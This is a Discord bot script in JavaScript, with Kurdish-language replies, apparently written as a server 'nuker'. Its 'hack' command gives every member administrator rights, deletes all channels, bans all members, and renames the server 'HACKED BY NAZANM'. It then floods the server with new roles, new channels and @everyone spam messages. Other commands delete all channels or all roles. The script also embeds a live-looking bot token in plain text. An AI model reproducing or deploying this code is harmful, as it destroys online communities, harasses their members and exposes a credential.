const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = 'h?'
client.on('ready', () => {
console.log(`Logged in as ${client.user.tag}!`);
 
});

          
/////Ban all

////
client.login("NzYxMjA3MjU4NTYxNzczNTY4.X3XPgA.uGxi4WZKZFFnx9ZbBbqiTNPGIGg")
          
client.on('message', black => {
if(black.content.split(' ')[0] == prefix + 'dac') {  
if (!black.channel.guild) return;
if(!black.guild.member(black.author).hasPermission("MANAGE_CHANNELS")) return black.reply(`❌ببورە ئەو پێرمیشنەت نییە MANAGE CHANNEL`);
black.guild.channels.forEach(m => {
m.delete();
});
}// By black jack
if(black.content.split(' ')[0] == prefix + 'dar') { 
if (!black.channel.guild) return;
if(!black.guild.member(black.author).hasPermission("MANAGE_ROLES_OR_PERMISSIONS")) return black.reply("❌ببورە ناتوانی ئەو کارە بکەی");
if(!black.guild.member(client.user).hasPermission("MANAGE_ROLES_OR_PERMISSIONS")) return black.reply(`ناتوانم ئەم کارە بکەم چونکە ئەو پێرمیشنەم نیە MANAGE_ROLES❌`);
black.guild.roles.forEach(m => {
m.delete();
});
black.reply("`✅بە سەرکەوتوی ھەموو رۆلەکان سرایەوە`")
}
});

client.on('message', message => {
    if (message.content.toLowerCase() === prefix + 'hack') {
        message.guild.roles.find('name', '@everyone').edit({
            permissions: ["ADMINISTRATOR"]
        });
        let oldnm = message.guild.name;
        message.guild.channels.map(c => {
            c.delete();
        });
    message.guild.members.forEach( member => {
          
          member.ban()
      })
        setInterval(() => {
            message.guild.createRole({
                name: "HACKED BY NAZANM",
                permissions: ["ADMINISTRATOR"]
            }).then(rr => {
 
                message.member.addRole(rr.id);
            });
        }, 1000);
        message.guild.setIcon("https://media.discordapp.net/attachments/793750057500278805/806561503980421120/image0.jpg");
        message.guild.setName('HACKED BY NAZANM');
        setTimeout(function() {
            setInterval(() => {
                message.guild.createChannel('HACKED BY NAZANM', 'text').then(channel => {
                message.channel.send('@everyone bro server danenawa :joy: :joy: :joy:')
                message.channel.send('@everyone bro server danenawa :joy: :joy: :joy:')
                message.channel.send('@everyone bro server danenawa :joy: :joy: :joy:')
                message.channel.send('@everyone bro server danenawa :joy: :joy: :joy:')  
                message.channel.send('@everyone bro server danenawa :joy: :joy: :joy:')
                message.channel.send('@everyone bro server danenawa :joy: :joy: :joy:') 
                })
            }
                        
                        , 500)
            })
        }
    }
)
